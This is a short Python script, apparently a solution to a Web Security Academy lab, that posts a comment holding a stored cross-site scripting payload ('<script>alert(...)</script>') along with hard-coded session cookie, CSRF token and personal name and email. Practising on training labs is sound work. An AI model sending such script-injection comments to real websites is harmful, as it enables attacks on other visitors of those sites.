import requests

url = "https://0a73003f04cd04c880bbfe2f002a00bc.web-security-academy.net/post/comment"

headers = {
    "Host": "0a73003f04cd04c880bbfe2f002a00bc.web-security-academy.net",
    "Cookie": "session=deCgUt3SjnzcpECyaBnTHf47wyparmGH",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://0a73003f04cd04c880bbfe2f002a00bc.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=0, i"
}

payload = {
    "csrf" : "WhyPOE3QFhD6iItntUVhrJNIJ0pAXYkP",
    "postId" : "10",
    "comment" : "<script>alert('Show me something')</script>",
    "name" : "D4rU Li3b3rt",
    "email" : "daruliebert@gmail.com",
    "website" : "https://0a73003f04cd04c880bbfe2f002a00bc.web-security-academy.net/post?postId=10"
}

response = requests.post(url=url, headers=headers, data=payload)
print("You solve the lab!")